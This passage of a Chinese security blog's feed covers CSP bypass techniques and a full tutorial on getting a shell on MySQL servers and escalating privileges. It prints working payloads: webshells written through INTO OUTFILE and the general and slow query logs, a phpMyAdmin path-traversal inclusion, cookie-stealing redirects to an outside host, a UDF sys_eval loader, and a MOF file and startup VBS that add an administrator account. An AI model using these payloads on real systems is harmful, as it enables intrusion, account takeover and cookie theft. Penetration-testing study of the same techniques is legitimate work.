class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200311151430.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200311151910.png" alt=""></p><h3 id="不完整的-lt-script-gt-标签绕过"><a href="#不完整的-lt-script-gt-标签绕过" class="headerlink" title="不完整的&lt;script&gt;标签绕过"></a>不完整的<code>&lt;script&gt;</code>标签绕过</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> header(<span class="string">"X-XSS-Protection:0"</span>);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'nonce-xxxxx'"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'xxxxx'</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="comment">//do some thing</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">/?<span class="attribute">xss</span>=a2u13&lt;script <span class="attribute">src</span>=<span class="string">"data:text/plain,alert(1)"</span> <span class="attribute">a</span>=123 a=</span><br></pre></td></tr></table></figure><p>看看效果</p><p>实际的拼接结果为:</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">a2u13&lt;script src="data:text/plain,alert(1)" a=123 a=&lt;script nonce='xxxxx'&gt;//do some thing&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这样会把<code>&lt;script</code>作为<code>a</code>的一个属性值被忽略掉，从而<code>nonce=&#39;xxxxx&#39;</code>被窃取为我们攻击<code>payload</code>的属性值</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200311154721.png" alt=""></p><p>不过现在不行了</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200311155053.png" alt=""></p><p>会提示违反了<code>none-xxxxx</code>策略，估计现在<code>src</code>和<code>nonce-xxxxx</code>不能一起使用的原因</p><h3 id="object-src绕过"><a href="#object-src绕过" class="headerlink" title="object-src绕过"></a>object-src绕过</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'self'"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>对于这种限制了<code>script-src</code>的策略，可以考虑从其他策略入手</p><p>比如<code>object-src</code>没有被设置时</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">src</span>=<span class="string">"http://vps_ip/exp.pdf"</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中由于<code>HTML</code>的会将一切文件尝试解析为文本的特性</p><p>可以在远程创建一个<code>PDF</code>,文件，其中里面加上我们的<code>payload</code></p><p>具体我也没有成功实现，感觉他代码有些问题</p><p><a href="https://blog.csdn.net/microzone/article/details/52850623" target="_blank" rel="noopener">https://blog.csdn.net/microzone/article/details/52850623</a></p><p>并且如果<code>frame-ancestors</code>限制了<code>&lt;embed</code>标签同样不可用</p><h3 id="SVG绕过"><a href="#SVG绕过" class="headerlink" title="SVG绕过"></a>SVG绕过</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD SVG 1.1&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Graphics&#x2F;SVG&#x2F;1.1&#x2F;DTD&#x2F;svg11.dtd&quot;&gt;</span><br><span class="line">&lt;svg version&#x3D;&quot;1.1&quot; id&#x3D;&quot;Layer_1&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; xmlns:xlink&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink&quot; x&#x3D;&quot;0px&quot; y&#x3D;&quot;0px&quot; width&#x3D;&quot;100px&quot; height&#x3D;&quot;100px&quot; viewBox&#x3D;&quot;0 0 751 751&quot; enable-background&#x3D;&quot;new 0 0 751 751&quot; xml:space&#x3D;&quot;preserve&quot;&gt;  &lt;image id&#x3D;&quot;image0&quot; width&#x3D;&quot;751&quot; height&#x3D;&quot;751&quot; x&#x3D;&quot;0&quot; y&#x3D;&quot;0&quot;</span><br><span class="line">    href&#x3D;&quot;data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; &#x2F;&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure><p>利用条件是可以上传<code>svg</code>图片</p><h3 id="通过不完整标签带出"><a href="#通过不完整标签带出" class="headerlink" title="通过不完整标签带出"></a>通过不完整标签带出</h3><p>原理感觉和不完整的<code>script</code>标签绕过方式一样</p><p>都是采用<code>src=&quot;http://vps_ip/c=</code></p><p>这里要求src需要在<code>CSP</code>当中或者<code>CSP</code>被设置为<code>*</code></p><p>我感觉挺鸡肋的…..</p><p>同时<code>Chrome</code>进制请求的<code>url</code>中存在<code>&lt; \n \r \t</code>等 </p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200311162030.png" alt=""></p><h3 id="CRLF绕过"><a href="#CRLF绕过" class="headerlink" title="CRLF绕过"></a>CRLF绕过</h3><p>通过<code>CRLF</code>漏洞把<code>CSP</code>挤到<code>HTTP</code>的消息返回体当中</p><p>从而绕过<code>CSP</code>限制</p><p><a href="https://www.cnblogs.com/tr1ple/p/6648767.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/6648767.html</a></p><h3 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h3><p><a href="https://www.freebuf.com/articles/web/162445.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/162445.html</a></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200311163938.png" alt=""></p><p>感觉利用条件太苛刻了</p><p>需要满足<code>style和img</code>可以跨域，数据在页面内部，实用性不是很高</p><h3 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a>URL跳转</h3><p>在<code>default-src</code> 为<code>&#39;none&#39;</code>条件下</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"1;url=http://www.xss.com/x.php?c=[cookie]"</span> &gt;</span></span><br></pre></td></tr></table></figure><p>在允许unsafe-inline的情况下</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.location=<span class="string">"http://www.xss.com/x.php?c=[cookie]"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;本文内容：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;CSP（内容安全策略）概念以及Bypass总结&lt;/p&gt;
    
    </summary>
    
    
      <category term="前端安全" scheme="https://a2u13.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CSP" scheme="https://a2u13.com/tags/CSP/"/>
    
  </entry>
  
  <entry>
    <title>Mysql的getshell与提权总结</title>
    <link href="https://a2u13.com/2020/03/06/Mysql%E7%9A%84getshell%E4%B8%8E%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
    <id>https://a2u13.com/2020/03/06/Mysql%E7%9A%84getshell%E4%B8%8E%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</id>
    <published>2020-03-06T10:09:18.000Z</published>
    <updated>2020-06-07T06:28:28.917Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文内容：</strong></p><ul><li>Mysql的getshell方法<ul><li>SELECT…INTO OUTFILE</li><li>general_log</li><li>slow_query_log</li><li>phpMyAdmin</li></ul></li><li>Mysql提权<ul><li>UDF提权</li><li>MOF提权</li><li>启动项提权</li></ul></li></ul><a id="more"></a><h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><h2 id="SELECT-“CONTNETS”-INTO-OUTFILE-“FILENAME”"><a href="#SELECT-“CONTNETS”-INTO-OUTFILE-“FILENAME”" class="headerlink" title="SELECT “CONTNETS” INTO OUTFILE “FILENAME”"></a>SELECT “CONTNETS” INTO OUTFILE “FILENAME”</h2><p><strong>满足条件：</strong></p><ul><li>没有运行在<code>secure-file-priv</code>模式下</li><li>对<code>Web</code>目录有读写权限</li><li>没有被过滤单双引号</li><li>知道<code>Web</code>的物理绝对路径</li></ul><p><strong>官方文档：</strong></p><blockquote><p><code>SELECT ... INTO OUTFILE</code> writes the selected rows to a file. Column and line terminators can be specified to produce a specific output format.</p></blockquote><blockquote><p>The <code>SELECT ... INTO OUTFILE &#39;file_name&#39;</code> form of <code>SELECT</code> writes the selected rows to a file. The file is created on the server host, so you must have the FILE privilege to use this syntax. file_name cannot be an existing file, which among other things prevents files such as <code>/etc/passwd</code> and database tables from being destroyed. The <code>character_set_filesystem system</code> variable controls the interpretation of the file name.</p></blockquote><blockquote><p>The <code>SELECT ... INTO OUTFILE</code> statement is intended primarily to let you very quickly dump a table to a text file on the server machine. If you want to create the resulting file on some other host than the server host, you normally cannot use <code>SELECT ... INTO OUTFILE</code>since there is no way to write a path to the file relative to the server host’s file system.</p></blockquote><p>查看安全设置：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306122420.png" alt=""></p><p><code>secure_file_priv</code>可以设置三个参数：<code>空，NULL，filepath</code></p><p><strong>参数说明：</strong></p><ul><li>空值：设置为空时，没有进行安全配置，那么这模式下应该就可以导出webshell</li><li>NULL：设置本参数值时，数据库不能进行导入导出</li><li>filepath：filepath是导入导出的文件路径，设置这个值，那么只能导出文件到filepath的路径。</li></ul><p>这里需要满足<code>secure_file_priv</code>为空或者为<code>web</code>路径才可以进行读写操作</p><p>如果不为空可在<code>my.ini</code>配置文件中加上<code>secure_file_priv =</code>即可（但都能修改配置文件了还需要写入木马？</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306120822.png" alt=""></p><p>如果目录不可写的话会出现以下错误：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306181450.png" alt=""></p><p>这时候给目录附上读写权限即可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306121031.png" alt=""></p><p>可以看到成功在<code>Web</code>目录下写下一句话</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306121128.png" alt=""></p><h2 id="使用log写入Shell"><a href="#使用log写入Shell" class="headerlink" title="使用log写入Shell"></a>使用<code>log</code>写入<code>Shell</code></h2><p><strong>满足条件：</strong></p><ul><li>数据库为<code>root</code>权限</li><li><code>Web</code>目录可写</li><li>知道<code>Web</code>的物理绝对路径</li></ul><p>首先开启<code>mysql</code>的日志记录模式</p><p>首先查看一下日志的配置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%general%&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306123517.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306123746.png" alt=""></p><p>打开日志记录</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log&#x3D;&#39;on&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306121720.png" alt=""></p><p>然后改变日志的路径</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log_file&#x3D;&#39;&#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;mysql_shell.php&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306121921.png" alt=""></p><p>然后直接查询一句话木马（如果服务器有狗的话，需要写入免杀的马）</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306122053.png" alt=""></p><p>可以看到成功写入<code>shell</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306122121.png" alt=""></p><p>最后记得关闭日志模式即可    </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log&#x3D;&#39;off&#39;;</span><br></pre></td></tr></table></figure><h2 id="PHPMyAdmin包含数据库文件getshell"><a href="#PHPMyAdmin包含数据库文件getshell" class="headerlink" title="PHPMyAdmin包含数据库文件getshell"></a>PHPMyAdmin包含数据库文件<code>getshell</code></h2><p>首先查询数据库文件的存储地址：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show global variables like &quot;%datadir%&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306125806.png" alt=""></p><p>其中的<code>.frm</code>即为我们的数据库文件</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306130008.png" alt=""></p><p>这里我们新建一个数据库<code>mysql_shell</code>，然后新建一个表<code>mysql_shell</code></p><p>给其中的一个字段写上我们的一句话木马</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306130237.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306130332.png" alt=""></p><p>这里我没有<code>PHPMyAdmin4.8.x</code>环境，下载一个新的4.8.1环境</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306130650.png" alt=""></p><p>在<code>mysql_shell</code>库中新建个<code>mysql_shell</code>表，然后字段写上我们的一句话马</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306142313.png" alt=""></p><p>然后查询数据库文件地址</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show global VARIABLES like &quot;%datadir%&quot;</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306142340.png" alt=""></p><p>然后直接老套路包含即可</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/index.php?target=db_sql.php%3f/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>Library<span class="regexp">/Application Support/</span>appsolute<span class="regexp">/MAMP PRO/</span>db<span class="regexp">/mysql57/my</span>sql_shell<span class="regexp">/mysql_shell.frm&amp;a=phpinfo();</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306142559.png" alt=""></p><p>这里只能用<code>GET</code>马，<code>POST</code>好像不太行，但可以直接传大马</p><p>还有，那个<code>.frm</code>文件必须要有权限才可以包含！！</p><h2 id="PHPMyaAdmin-本地SESSION包含getshell"><a href="#PHPMyaAdmin-本地SESSION包含getshell" class="headerlink" title="PHPMyaAdmin 本地SESSION包含getshell"></a>PHPMyaAdmin 本地<code>SESSION</code>包含<code>getshell</code></h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306142821.png" alt=""></p><p>这里需要得知<code>session.save_path</code>，可以在<code>php.ini</code>中看到</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306143550.png" alt=""></p><p>不过一般默认为<code>/tmp</code>路径下</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306143705.png" alt=""></p><p>然后查看我们目录下的<code>session.save_path</code>下，的确存在这个<code>session</code>文件</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306143620.png" alt=""></p><p>直接包含这个<code>session</code>文件即可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306143938.png" alt=""></p><p>这里需要注意的是，他会执行你在这个会话中所有的<code>PHP</code>语句</p><p>比如我之前写入过<code>&lt;?php phpinfo(); ?&gt;</code>，他就会执行</p><p>所以说建议最新的命令后面加个<code>exit();</code>来停止后面命令的解析，否则加载起来太卡了。。</p><h2 id="慢日志getshell"><a href="#慢日志getshell" class="headerlink" title="慢日志getshell"></a>慢日志<code>getshell</code></h2><p><strong>官方文档：</strong></p><blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306151208.png" alt=""></p></blockquote><p>大概意思是会记录超过限定查询时间的查询语句到一个特定的慢查询日志当中</p><p>这里查询一下全局配置</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show GLOBAL VARIABLES like &quot;%slow%&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306151456.png" alt=""></p><p>可以看到我们可以设置查询时间以及日志的路径</p><p>首先启用慢查询日志</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set GLOBAL slow_query_log&#x3D;on;</span><br></pre></td></tr></table></figure><p>然后修改慢日志路径</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global slow_query_log_file &#x3D; &#39;&#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;mysql_shell.php&#39;;</span><br></pre></td></tr></table></figure><p>这时候用<code>sleep(5)</code>来延迟查询</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[&#39;a2u13&#39;]); ?&gt;&quot; from mysql.db where sleep(10);</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306152504.png" alt=""></p><p>可以看到查询被写入了慢日志当中</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306152601.png" alt=""></p><p>成功<code>getshell</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306152641.png" alt=""></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>UDF简介：<a href="https://www.cnblogs.com/ghc666/p/8609067.html" target="_blank" rel="noopener">https://www.cnblogs.com/ghc666/p/8609067.html</a></p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p><strong>UDF提权需要数据库在root权限在才可以进行提权！！</strong></p><p><strong>UDF提权需要数据库在root权限在才可以进行提权！！</strong></p><p><strong>UDF提权需要数据库在root权限在才可以进行提权！！</strong></p><p><strong>而且在mysql库下必须有func表，并且在‑‑skip‑grant‑tables开启的情况下，UDF会被禁止</strong></p><blockquote><p>适用于<code>Linux 64位</code>的<code>UDF</code>的so文件<br><a href="http://a2u13-pic.oss-accelerate.aliyuncs.com/annex/lib_mysqludf_sys64.so" target="_blank" rel="noopener">http://a2u13-pic.oss-accelerate.aliyuncs.com/annex/lib_mysqludf_sys64.so</a></p><p>适用于<code>Linux 32位</code>的<code>UDF</code>的so文件<br><a href="http://a2u13-pic.oss-accelerate.aliyuncs.com/annex/lib_mysqludf_sys32.so" target="_blank" rel="noopener">http://a2u13-pic.oss-accelerate.aliyuncs.com/annex/lib_mysqludf_sys32.so</a></p></blockquote><p>64位支持的自定义函数如下：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306170707.png" alt=""></p><p>32位支持的自定义函数如下：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306170647.png" alt=""></p><p>一般使用以下几个函数：</p><ul><li>sys_eval - executes an arbitrary command, and returns it’s output.</li><li>sys_exec - executes an arbitrary command, and returns it’s exit code.</li><li>sys_get - gets the value of an environment variable.</li><li>sys_set - create an environment variable, or update the value of an existing environment variable.</li></ul><p>首先查看插件库路径：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &quot;%plugin_dir%&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306170831.png" alt=""></p><p>这里要满足对<code>plugin_dir</code>的写入权限</p><p>这里如果目录可控，则可以直接吧so文件上传到插件目录下</p><p>否则需要使用十六进制查询将文件写入<code>plugin</code>目录下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select unhex(&#39;7F454C46020...&#39;) into dumpfile &#39;plugin_dir&#x2F;mysqludf.so&#39;;</span><br></pre></td></tr></table></figure><p>十六进制可通过<code>hexdump</code>等工具获得</p><p>也可以通过以下语句保存到本地文件当中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select hex(load_file(&#39;lib_mysqludf_sys.so&#39;)) into outfile &#39;udf_hex.txt&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200306171833.png" alt=""></p><p>写入之后加载自定义函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create function sys_eval returns string soname &quot;mysqludf.so&quot;;</span><br></pre></td></tr></table></figure><p>最后执行命令即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#39;whoami&#39;);</span><br></pre></td></tr></table></figure><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><blockquote><p>适用于<code>Linux 64位</code>的<code>UDF</code>的dll链接库</p><p><a href="http://a2u13-pic.oss-accelerate.aliyuncs.com/annex/lib_mysqludf_sys64.dll" target="_blank" rel="noopener">http://a2u13-pic.oss-accelerate.aliyuncs.com/annex/lib_mysqludf_sys64.dll</a></p><p>适用于<code>Linux 32位</code>的<code>UDF</code>的dll链接库</p><p><a href="http://a2u13-pic.oss-accelerate.aliyuncs.com/annex/lib_mysqludf_sys632.dll" target="_blank" rel="noopener">http://a2u13-pic.oss-accelerate.aliyuncs.com/annex/lib_mysqludf_sys632.dll</a></p></blockquote><p>Windows下提权的条件：</p><ul><li>如果<code>mysql</code>版本大于5.1，<code>lib_mysqludf_sys64.dll</code>文件必须放置在<code>plugin</code>文件夹下</li><li>如果<code>mysql</code>版本小于5.1，<code>lib_mysqludf_sys64.dll</code>文件在<code>Windows Server 2003</code>下放置于<code>c:\windows\system32</code>目录，在<code>Windows Server 2000</code>下放置在<code>c:\winnt\system32</code>目录中</li></ul><p>可以通过<code>INTO DUMPFILE</code>写入，但一般会有<code>secure_file_priv</code>的限制，还不如直接用<code>webshell</code>传到<code>plugin</code>目录下</p><p>剩下的与<code>Linux</code>下<code>UDF</code>提权的步骤一致</p><p>只不过要注意系统是32位还是64位的，以及<code>Mysql</code>的版本号（使用<code>select @@version;</code>来查询版本号）</p><h2 id="MOF提权（只用于Windows"><a href="#MOF提权（只用于Windows" class="headerlink" title="MOF提权（只用于Windows)"></a>MOF提权（只用于Windows)</h2><p><strong>MOF概念与提权原理：</strong></p><blockquote><p>mof是windows系统的一个文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”其作用是每隔五秒就会去监控进程创建和死亡。其就是用又了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p></blockquote><p><strong>利用条件：</strong></p><ul><li><p><code>Windows 03</code>及以下版本</p></li><li><p><code>mysql</code>启动身份具有权限去读写<code>c:/windows/system32/wbem/mof</code>目录</p></li><li><p><code>secure-file-priv</code>参数不为<code>NULL</code></p></li></ul><p>这里附上可用的<code>MOF</code>文件：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="meta">#pragma namespace("\\\\.\\root\\subscription")</span></span><br><span class="line">instance <span class="keyword">of</span> __EventFilter <span class="keyword">as</span> $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = <span class="string">"Root\\Cimv2"</span>;</span><br><span class="line">Name = <span class="string">"filtP2"</span>;</span><br><span class="line">Query = <span class="string">"Select * From __InstanceModificationEvent "</span></span><br><span class="line"><span class="string">"Where TargetInstance Isa \"</span>Win32_LocalTime\<span class="string">" "</span></span><br><span class="line"><span class="string">"And TargetInstance.Second = 5"</span>;</span><br><span class="line">QueryLanguage = <span class="string">"WQL"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance <span class="keyword">of</span> ActiveScriptEventConsumer <span class="keyword">as</span> $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = <span class="string">"consPCSV2"</span>;</span><br><span class="line">ScriptingEngine = <span class="string">"JScript"</span>;</span><br><span class="line">ScriptText =</span><br><span class="line"><span class="string">"var WSH = new ActiveXObject(\"</span>WScript.Shell\<span class="string">")\nWSH.run(\"</span>net.exe user a2u13 <span class="number">666666</span> /add\<span class="string">")"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance <span class="keyword">of</span> __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>将这段代码<code>INTO DUMPFILE</code>到<code>c:/windows/system32/wbem/mof/nullevt.mof</code>中</p><p>此时会每隔五秒生成一个<code>a2u13</code>的用户，密码为<code>666666</code></p><p>当然也可以自己修改命令执行</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">ScriptText =</span><br><span class="line"><span class="string">"var WSH = new ActiveXObject(\"</span>WScript.Shell\<span class="string">")\nWSH.run(\"</span>net.exe user a2u13 <span class="number">666666</span> /add\<span class="string">")"</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h2><p>原理其实是一致的，都是把<code>VBS</code>脚本写入到开机自启的文件夹中，从而实现提权</p><p><strong>满足条件：</strong></p><ul><li><code>mysql</code>为<code>root</code>权限</li><li><code>secure_file_priv</code>为空</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create database udfs;</span><br><span class="line">use udfs;</span><br><span class="line">create table udf (cmd text); </span><br><span class="line">insert into udf values (&quot;set wshshell&#x3D;createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot; ); </span><br><span class="line">insert into udf values (&quot;a&#x3D;wshshell.run (&quot;&quot;cmd.exe &#x2F;c net user a2u13 666666 &#x2F;add&quot;&quot;,0) &quot; ); </span><br><span class="line">insert into udf values (&quot;b&#x3D;wshshell.run (&quot;&quot;cmd.exe &#x2F;c net localgroup administrators a2u13 &#x2F;add&quot;&quot;,0) &quot; ); </span><br><span class="line">select * from udf into outfile &quot;C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\udf.vbs&quot;;</span><br></pre></td></tr></table></figure><p>这里就不加数据库存在判断了，自己也可以修改库名和表名</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;本文内容：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Mysql的getshell方法&lt;ul&gt;
&lt;li&gt;SELECT…INTO OUTFILE&lt;/li&gt;
&lt;li&gt;general_log&lt;/li&gt;
&lt;li&gt;slow_query_log&lt;/li&gt;
&lt;li&gt;phpMyAdmin&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mysql提权&lt;ul&gt;
&lt;li&gt;UDF提权&lt;/li&gt;
&lt;li&gt;MOF提权&lt;/li&gt;
&lt;li&gt;启动项提权&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="渗透知识" scheme="https://a2u13.com/categories/%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="Mysql" scheme="https://a2u13.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>Socks5握手连接过程与数据包分析</title>
    <link href="https://a2u13.com/2020/03/04/Socks5%E6%8F%A1%E6%89%8B%E8%BF%9E%E6%8E%A5%E8%BF%87%E7%A8%8B%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/"/>
    <id>https://a2u13.com/2020/03/04/Socks5%E6%8F%A1%E6%89%8B%E8%BF%9E%E6%8E%A5%E8%BF%87%E7%A8%8B%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/</id>
    <published>2020-03-03T16:13:27.000Z</published>
    <updated>2020-06-07T06:28:28.931Z</updated>
    
